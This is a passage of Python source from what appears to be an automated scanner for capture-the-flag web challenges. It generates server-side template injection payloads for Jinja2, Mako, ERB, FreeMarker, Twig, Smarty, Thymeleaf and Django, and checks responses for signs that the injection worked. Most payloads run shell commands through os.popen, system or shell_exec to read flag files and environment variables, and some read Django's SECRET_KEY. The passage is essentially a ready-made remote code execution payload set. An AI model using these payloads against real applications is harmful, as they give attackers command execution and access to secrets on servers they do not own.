    for match in re.finditer(
        r"\b([A-Za-z_][A-Za-z0-9_]{1,30})\s+is\s+required", body, re.IGNORECASE
    ):
        candidates.append(match.group(1))
    return [name for name in _dedupe(candidates) if name != exclude][:8]


def _augment_target_with_params(target: dict[str, object], params: list[str]) -> dict[str, object]:
    if str(target.get("kind") or "") != "query_param":
        return target
    url = str(target.get("url") or "")
    for name in params:
        url = inject_query_param(url, name, "1")
    return target | {"url": url, "supplemented_params": params}


def _ssti_extraction_payloads(engines: list[str]) -> list[str]:
    payloads: list[str] = []
    engine_text = " ".join(engines)
    if "django" in engine_text:
        payloads.extend(_django_ssti_payloads())
    if any(engine in engine_text for engine in ("jinja2", "tornado", "nunjucks")):
        payloads.extend(_jinja_ssti_payloads())
    if "mako" in engine_text:
        payloads.extend(_mako_ssti_payloads())
    if "erb" in engine_text or "ejs" in engine_text:
        payloads.extend(_erb_ssti_payloads())
    if "freemarker" in engine_text:
        payloads.extend(_freemarker_ssti_payloads())
    if "twig" in engine_text:
        payloads.extend(_twig_ssti_payloads())
    if "smarty" in engine_text:
        payloads.extend(_smarty_ssti_payloads())
    if "thymeleaf" in engine_text:
        payloads.extend(_thymeleaf_ssti_payloads())
    payloads.extend(_generic_ssti_payloads())
    return _dedupe(payloads)[:24]


def _flag_read_shell() -> str:
    return (
        "printenv FLAG CTF_FLAG CHALLENGE_FLAG 2>/dev/null; "
        "cat ./FLAG ./FLAG.txt ./flag ./flag.txt FLAG FLAG.txt flag flag.txt "
        "$HOME/FLAG $HOME/FLAG.txt $HOME/flag $HOME/flag.txt "
        "/FLAG /FLAG.txt /flag /flag.txt "
        "/tmp/FLAG /tmp/FLAG.txt /tmp/flag /tmp/flag.txt "
        "/app/FLAG /app/FLAG.txt /app/flag /app/flag.txt "
        "/var/www/html/FLAG /var/www/html/FLAG.txt /var/www/html/flag /var/www/html/flag.txt "
        "/root/FLAG /root/FLAG.txt /root/flag /root/flag.txt 2>/dev/null"
    )


def _jinja_ssti_payloads() -> list[str]:
    command = _flag_read_shell()
    return [
        "{{config}}",
        "{{config.items()}}",
        "{{config.FLAG}}",
        "{{cycler.__init__.__globals__.os.environ}}",
        "{{joiner.__init__.__globals__.os.environ}}",
        "{{namespace.__init__.__globals__.os.environ}}",
        "{{lipsum.__globals__['os'].environ}}",
        "{{url_for.__globals__.os.environ}}",
        "{{cycler.__init__.__globals__.os.popen('" + command + "').read()}}",
        "{{joiner.__init__.__globals__.os.popen('" + command + "').read()}}",
        "{{namespace.__init__.__globals__.os.popen('" + command + "').read()}}",
        "{{lipsum.__globals__['os'].popen('" + command + "').read()}}",
        "{{config.__class__.__init__.__globals__['os'].popen('" + command + "').read()}}",
        "{{url_for.__globals__.os.popen('" + command + "').read()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('"
        + command
        + "').read()}}",
    ]


def _mako_ssti_payloads() -> list[str]:
    command = _flag_read_shell()
    return ["${__import__('os').popen('" + command + "').read()}"]


def _erb_ssti_payloads() -> list[str]:
    command = _flag_read_shell()
    return ["<%= `" + command + "` %>"]


def _freemarker_ssti_payloads() -> list[str]:
    command = _flag_read_shell()
    return ['${"freemarker.template.utility.Execute"?new()("' + command + '")}']


def _twig_ssti_payloads() -> list[str]:
    command = _flag_read_shell()
    return [
        "{{['" + command + "']|filter('system')}}",
        "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('"
        + command
        + "')}}",
    ]


def _django_ssti_payloads() -> list[str]:
    return [
        "{{FLAG}}",
        "{{flag}}",
        "{{CTF_FLAG}}",
        "{{CHALLENGE_FLAG}}",
        "{{settings.FLAG}}",
        "{{settings.flag}}",
        "{{settings.CTF_FLAG}}",
        "{{settings.CHALLENGE_FLAG}}",
        "{{settings.SECRET_KEY}}",
        "{{request.META.FLAG}}",
        "{{request.META.HTTP_FLAG}}",
        "{{request.META.CTF_FLAG}}",
        "{{request.META.HTTP_CTF_FLAG}}",
        "{{request.META.CHALLENGE_FLAG}}",
        "{{request.META.HTTP_CHALLENGE_FLAG}}",
        "{{request.META.HTTP_HOST}}",
        "{{debug}}",
        "{% debug %}",
    ]


def _smarty_ssti_payloads() -> list[str]:
    command = _flag_read_shell()
    return [
        "{system('" + command + "')}",
        "{php}echo shell_exec('" + command + "');{/php}",
    ]


def _thymeleaf_ssti_payloads() -> list[str]:
    return [
        "${T(java.nio.file.Files).readString(T(java.nio.file.Paths).get('/flag'))}",
        "${T(java.nio.file.Files).readString(T(java.nio.file.Paths).get('/flag.txt'))}",
        "__${T(java.nio.file.Files).readString(T(java.nio.file.Paths).get('/flag'))}__",
    ]


def _generic_ssti_payloads() -> list[str]:
    return [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
    ]


def _ssti_execution_signal(body: str) -> dict[str, object]:
    lowered = body.lower()
    if "uid=" in lowered and "gid=" in lowered:
        return {"kind": "command_output", "marker": "uid/gid"}
    if any(path in body for path in ("/bin/bash", "/usr/sbin/nologin", "root:x:0:0:")):
        return {"kind": "file_output", "marker": "passwd-like"}
    return {}


def _ssti_engines_for_signal(
    case: dict[str, object],
    signal: dict[str, object],
    body: str,
) -> list[str]:
    engines = _string_items(case.get("engines"))
    text = " ".join(
        [
            body[:5000],
            json.dumps(signal, sort_keys=True),
        ]
    ).lower()
    if any(marker in text for marker in ("django", "templatesyntaxerror", "template syntaxerror")):
        engines.insert(0, "django")
    return _dedupe(engines)


def _ssti_signal(
    response: ProbeResponse, *, baseline: ProbeResponse, case: dict[str, object]
) -> dict[str, object]:
    payload = str(case["payload"])
    for expected in _string_items(case.get("expected")):
        if expected and expected in response.body and expected not in baseline.body:
            surrounding = _surrounding(response.body, expected, radius=80)
            if payload not in surrounding:
                return {
                    "kind": "evaluated_expression",
                    "observed": expected,
                    "surrounding": surrounding,
                }
    markers = _template_error_markers(response.body)
    baseline_markers = set(_template_error_markers(baseline.body))
    new_markers = [marker for marker in markers if marker not in baseline_markers]
    if new_markers:
        return {"kind": "template_error", "markers": new_markers[:6]}
    return {}


def _template_error_markers(body: str) -> list[str]:
    lowered = body.lower()
    return [
        marker
        for marker in (
            "jinja2",
            "twig",
            "template syntax",
            "templatesyntaxerror",
            "templateerror",
            "django",
            "freemarker",
            "velocity",
            "smarty",
            "mako",
            "erb",
            "thymeleaf",
            "undefined variable",
        )
        if marker in lowered
    ]


def _surrounding(text: str, needle: str, *, radius: int) -> str:
    position = text.find(needle)
    if position < 0:
        return ""
    return str(clip(text[max(0, position - radius) : position + len(needle) + radius], radius * 2))
